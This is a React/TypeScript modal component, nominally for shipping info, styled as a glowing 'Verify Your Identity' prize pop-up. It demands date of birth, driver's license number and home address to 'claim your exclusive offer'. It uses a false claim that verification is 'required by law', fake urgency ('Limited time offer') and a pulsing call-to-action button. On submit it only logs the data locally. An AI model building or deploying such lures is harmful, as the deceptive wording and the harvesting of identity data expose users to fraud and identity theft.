import React, { useState } from 'react';
import {
  Dialog,
  DialogContent,
  Button,
  Typography,
  Box,
  IconButton,
  TextField,
  Grid,
} from '@mui/material';
import CloseIcon from '@mui/icons-material/Close';
import LocalShippingIcon from '@mui/icons-material/LocalShipping';
import LockIcon from '@mui/icons-material/Lock';

interface ShippingInfoProps {
  open: boolean;
  onClose: () => void;
}

export const ShippingInfo: React.FC<ShippingInfoProps> = ({ open, onClose }) => {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    addressLine1: '',
    addressLine2: '',
    city: '',
    state: '',
    zip: '',
    dob: '',
    driversLicense: '',
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log('Form submitted:', formData);
    onClose();
  };

  return (
    <Dialog
      open={open}
      onClose={onClose}
      maxWidth="sm"
      fullWidth
      sx={{
        '& .MuiDialog-paper': {
          background: 'linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%)',
          borderRadius: '16px',
          position: 'relative',
          overflow: 'visible',
          p: 2,
          animation: 'glow 2s infinite',
          '@keyframes glow': {
            '0%': { boxShadow: '0 0 10px rgba(255, 107, 107, 0.5)' },
            '50%': { boxShadow: '0 0 20px rgba(255, 142, 83, 0.8)' },
            '100%': { boxShadow: '0 0 10px rgba(255, 107, 107, 0.5)' },
          },
        }
      }}
    >
      <IconButton
        onClick={onClose}
        sx={{
          position: 'absolute',
          right: -10,
          top: -10,
          backgroundColor: 'white',
          '&:hover': { backgroundColor: '#f5f5f5' },
          zIndex: 1,
        }}
      >
        <CloseIcon />
      </IconButton>

      <DialogContent>
        <Box
          component="form"
          onSubmit={handleSubmit}
          sx={{
            display: 'flex',
            flexDirection: 'column',
            gap: 2,
            color: 'white',
          }}
        >
          <Box sx={{ textAlign: 'center', mb: 3 }}>
            <LocalShippingIcon sx={{ fontSize: 48, mb: 2 }} />
            <Typography variant="h4" sx={{ fontWeight: 'bold', mb: 1 }}>
              🎁 Verify Your Identity 🎁
            </Typography>
            <Typography variant="subtitle1" sx={{ mb: 2 }}>
              Complete verification now to claim your exclusive offer!
            </Typography>
            <Box sx={{ 
              display: 'flex', 
              alignItems: 'center', 
              justifyContent: 'center',
              bgcolor: 'rgba(255,255,255,0.1)',
              p: 1,
              borderRadius: 1,
              mb: 2
            }}>
              <LockIcon sx={{ mr: 1, fontSize: 20 }} />
              <Typography variant="caption">
                Secure verification required by law
              </Typography>
            </Box>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={6}>
              <TextField
                required
                fullWidth
                label="Date of Birth"
                type="date"
                variant="filled"
                InputLabelProps={{ shrink: true }}
                value={formData.dob}
                onChange={(e) => setFormData({...formData, dob: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={6}>
              <TextField
                required
                fullWidth
                label="Driver's License Number"
                variant="filled"
                value={formData.driversLicense}
                onChange={(e) => setFormData({...formData, driversLicense: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={6}>
              <TextField
                required
                fullWidth
                label="First Name"
                variant="filled"
                value={formData.firstName}
                onChange={(e) => setFormData({...formData, firstName: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={6}>
              <TextField
                required
                fullWidth
                label="Last Name"
                variant="filled"
                value={formData.lastName}
                onChange={(e) => setFormData({...formData, lastName: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={12}>
              <TextField
                required
                fullWidth
                label="Address Line 1"
                variant="filled"
                value={formData.addressLine1}
                onChange={(e) => setFormData({...formData, addressLine1: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={12}>
              <TextField
                fullWidth
                label="Address Line 2"
                variant="filled"
                value={formData.addressLine2}
                onChange={(e) => setFormData({...formData, addressLine2: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={6}>
              <TextField
                required
                fullWidth
                label="City"
                variant="filled"
                value={formData.city}
                onChange={(e) => setFormData({...formData, city: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={3}>
              <TextField
                required
                fullWidth
                label="State"
                variant="filled"
                value={formData.state}
                onChange={(e) => setFormData({...formData, state: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
            <Grid item xs={3}>
              <TextField
                required
                fullWidth
                label="ZIP"
                variant="filled"
                value={formData.zip}
                onChange={(e) => setFormData({...formData, zip: e.target.value})}
                sx={{ bgcolor: 'rgba(255,255,255,0.9)', borderRadius: 1 }}
              />
            </Grid>
          </Grid>

          <Button
            type="submit"
            variant="contained"
            size="large"
            sx={{
              mt: 3,
              bgcolor: '#2ecc71',
              color: 'white',
              fontWeight: 'bold',
              fontSize: '1.1rem',
              py: 1.5,
              '&:hover': {
                bgcolor: '#27ae60',
              },
              animation: 'pulse 1.5s infinite',
              '@keyframes pulse': {
                '0%': { transform: 'scale(1)' },
                '50%': { transform: 'scale(1.05)' },
                '100%': { transform: 'scale(1)' },
              },
            }}
          >
            VERIFY NOW & CLAIM OFFER
          </Button>
          <Typography variant="caption" sx={{ textAlign: 'center', opacity: 0.8 }}>
            *Verification required for security purposes. Limited time offer.
          </Typography>
        </Box>
      </DialogContent>
    </Dialog>
  );
};
